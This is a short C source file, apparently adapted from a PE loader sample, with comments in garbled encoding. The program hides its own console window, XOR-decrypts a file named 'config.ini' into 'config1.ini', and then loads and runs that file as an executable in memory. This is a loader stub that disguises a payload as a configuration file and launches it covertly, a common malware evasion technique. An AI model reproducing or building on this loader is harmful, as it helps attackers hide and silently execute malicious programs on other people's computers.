#include "PeLdr.h"
#include "Debug.h"
#include "../resource.h"
static
INT ShowUsage()
{
	printf("-- PE Loader Sample --\n\n");
	printf("PeLdr [PE-File]\n");
	printf("\n");

	return 0;
}


int xor()
{
  char* szSource="config.ini";
  char* szDestination="config1.ini";

  FILE *hSource;
  FILE *hDestination;
   
  DWORD dwKey=0x6a6a6a6a;
  char* pbBuffer;
  DWORD dwBufferLen=sizeof(DWORD);
  DWORD dwCount;
  DWORD dwData;

  hSource = fopen(szSource,"rb");// ��Դ�ļ�.
  hDestination = fopen(szDestination,"wb");    //��Ŀ���ļ�
  if (hSource==NULL) {printf("open Source File error !"); return false ;}
  if (hDestination==NULL){ printf("open Destination File error !");  return false ;}
   
  //���仺����
  pbBuffer=(char* )malloc(dwBufferLen);
   
  do {
    // ��Դ�ļ��ж���dwBlockLen���ֽ�
    dwCount = fread(pbBuffer, 1, dwBufferLen, hSource);
    //��������
    dwData = *(DWORD*)pbBuffer;  //char* TO dword
    dwData^=dwKey;        //xor operation
    pbBuffer = (char *) &dwData;
    // �����ܹ�������д��Ŀ���ļ�
    fwrite(pbBuffer, 1, dwCount, hDestination);
  } while(!feof(hSource));
  
    //�ر��ļ����ͷ��ڴ�
     fclose(hSource);
     fclose(hDestination);
   
  printf("%s is encrypted to %s\n",szSource,szDestination);
  return 0;
}


int wmain(int argc, wchar_t *argv[])
{
	
	//test();
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	xor();
	PE_LDR_PARAM peLdr;

	//if(argc < 2)
		//return ShowUsage();

	PeLdrInit(&peLdr);
	PeLdrSetExecutablePath(&peLdr, L"config1.ini");
	PeLdrStart(&peLdr);

	return 0;
}